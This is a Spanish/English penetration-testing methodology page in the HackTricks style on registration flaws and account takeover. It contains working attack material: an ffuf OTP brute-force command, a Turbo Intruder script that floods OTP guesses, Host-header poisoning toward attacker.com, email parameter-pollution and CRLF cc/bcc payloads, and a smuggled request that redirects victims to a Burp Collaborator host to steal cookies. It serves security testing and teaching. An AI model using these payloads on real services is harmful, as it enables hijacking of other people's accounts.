# Vulnerabilidades de Registro y Toma de Control

{{#include ../banners/hacktricks-training.md}}

## Toma de control por registro

### Registro duplicado

- Intenta generar usando un nombre de usuario existente
- Prueba variaciones del email:
- mayúsculas
- +1@
- agrega algún punto en el email
- caracteres especiales en la parte local del email (%00, %09, %20)
- Pon caracteres en blanco después del email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prueba trucos de canonicalización del proveedor de correo (depende del servicio):
- Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Algunos proveedores no distinguen mayúsculas/minúsculas en la parte local
- Algunos proveedores aceptan confusables unicode. Prueba homoglyphs y soft hyphen `\u00AD` dentro de la parte local
- Abusa de esto para: evadir las comprobaciones de unicidad, obtener cuentas duplicadas/invitaciones a workspace, o bloquear registros de la víctima (DoS temporal) mientras preparas la toma

### Enumeración de nombres de usuario

Comprueba si puedes averiguar cuándo un nombre de usuario ya está registrado dentro de la aplicación.

- Mensajes de error diferentes o códigos de estado HTTP
- Diferencias en timing (un usuario existente puede desencadenar una búsqueda en IdP/DB)
- Autocompletado del formulario de registro con datos de perfil para emails conocidos
- Revisa los flujos de equipo/invitación: introducir un email puede revelar si existe una cuenta

### Política de contraseñas

Al crear un usuario, verifica la política de contraseñas (comprueba si puedes usar contraseñas débiles).\
En ese caso puedes intentar bruteforce a credenciales.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Cambiar correo electrónico

Una vez registrado, intenta cambiar el email y verifica si este cambio se valida correctamente o si puedes cambiarlo a emails arbitrarios.

### Más comprobaciones

- Comprueba si puedes usar **disposable emails** (mailinator, yopmail, 1secmail, etc.) o evadir la blocklist con subaddressing como `victim+mailinator@gmail.com`
- **Contraseña larga** (>200) provoca **DoS**
- **Comprueba los rate limits en la creación de cuentas**
- Usa username@**burp_collab**.net y analiza el **callback**
- Si se usa verificación por número de teléfono, revisa casos límite de phone parsing/injection

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Verificación débil de Email/Teléfono (OTP/Magic Link)

Los flujos de registro suelen verificar la propiedad mediante un OTP numérico o un token de magic-link. Fallos típicos:

- OTP adivinables o cortos (4–6 dígitos) sin rate limiting efectivo ni tracking por IP/dispositivo. Prueba adivinanzas en paralelo y rotación de header/IP.
- Reutilización del OTP entre acciones o cuentas, o no ligado al usuario/acción específico (p. ej., el mismo código funciona para login y signup, o funciona después de cambiar el email).
- Multi-value smuggling: algunos backends aceptan múltiples códigos y verifican si alguno coincide. Prueba:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguir códigos wrong vs expired vs wrong-user por status/message/body length.
- Tokens no invalidados tras el éxito o después de cambiar la contraseña/email.
- Verification token no ligado a user agent/IP, permitiendo completar cross-origin desde páginas controladas por el atacante.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Conjeturas paralelas/concurrentes para evitar bloqueos secuenciales (usar Turbo Intruder en Burp):

<details>
<summary>Fragmento de Turbo Intruder para inundar intentos de OTP de 6 dígitos</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (antes de que la víctima se registre)

Una poderosa clase de problemas ocurre cuando un atacante realiza acciones sobre el email de la víctima antes de que esta cree su cuenta, y luego recupera el acceso más tarde.

Técnicas clave para probar (adáptalas a los flujos del objetivo):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Consejos prácticos

- Harvest flows and endpoints from web/mobile bundles. Busca classic signup, SSO linking, email/phone change y los endpoints de password reset.
- Crea automatizaciones realistas para mantener sesiones vivas mientras pruebas otros flujos.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
  - all other sessions and tokens are invalidated,
  - pending email/phone change capabilities are cancelled,
  - previously linked IdPs/emails/phones are re‑verified.

Nota: Metodologías extensas y estudios de caso sobre estas técnicas están documentados por la investigación de pre‑hijacking de Microsoft (ver References al final).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en parámetros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesión con su cuenta y acceder a la función **Cambiar contraseña**.
2. Inicia Burp Suite y activa Intercept para capturar la solicitud
3. Envíala a la pestaña Repeater y edita los parámetros: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token débil de restablecimiento de contraseña <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El token de restablecimiento de contraseña debe generarse de forma aleatoria y ser único cada vez.\
Intenta determinar si el token expira o si siempre es el mismo; en algunos casos el algoritmo de generación es débil y puede adivinarse. Las siguientes variables podrían usarse en el algoritmo.

- Marca de tiempo
- ID de usuario
- Correo electrónico del usuario
- Nombre y apellidos
- Fecha de nacimiento
- Criptografía
- Solo números
- Secuencia corta de token ( caracteres entre \[A-Z,a-z,0-9])
- Reutilización de token
- Fecha de expiración del token

### Filtración del token de restablecimiento de contraseña <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Genera una solicitud de restablecimiento de contraseña usando la API/UI para un correo específico, p.ej.: test@mail.com
2. Inspecciona la respuesta del servidor y busca `resetToken`
3. Luego usa el token en una URL como `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Restablecimiento de contraseña mediante colisión de nombre de usuario <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Regístrate en el sistema con un nombre de usuario idéntico al de la víctima, pero con espacios en blanco añadidos antes y/o después del nombre. p.ej.: `"admin "`
2. Solicita un restablecimiento de contraseña con tu nombre de usuario malicioso.
3. Usa el token enviado a tu correo y restablece la contraseña de la víctima.
4. Accede a la cuenta de la víctima con la nueva contraseña.

La plataforma CTFd fue vulnerable a este ataque.\
Véase: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Toma de cuenta mediante Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentra un XSS dentro de la aplicación o en un subdominio si las cookies están asignadas al dominio padre : `*.domain.com`
2. Leak la **cookie de sesión** actual
3. Autentícate como el usuario usando la cookie

### Toma de cuenta mediante HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Construye una petición que sobrescriba el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con el objetivo de abrir un redirect de las víctimas hacia burpcollab y robar sus cookies\
3. La petición final podría verse como la siguiente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reporta la explotación de este bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Toma de control de cuenta vía CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea una carga útil para el CSRF, p.ej.: “HTML form with auto submit for a password change”
2. Envía la carga útil

### Toma de control de cuenta vía JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token podría usarse para autenticar a un usuario.

- Edita el JWT con otro User ID / Email
- Comprueba si la firma JWT es débil


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Algunos signup handlers realizan un upsert cuando el email proporcionado ya existe. Si el endpoint acepta un cuerpo mínimo con un email y password y no exige verificación de propiedad, enviar el email de la víctima sobrescribirá su password antes de autenticarse.

- Descubrimiento: harvest endpoint names from bundled JS (or mobile app traffic), luego fuzz rutas base como /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Pistas del método: un GET que devuelve mensajes como "Only POST request is allowed." suele indicar el verbo correcto y que se espera un JSON body.
- Cuerpo mínimo observado en entornos reales:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Ejemplo PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impacto: Toma total de la cuenta (ATO) sin ningún reset token, OTP o verificación por correo electrónico.

## Referencias

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
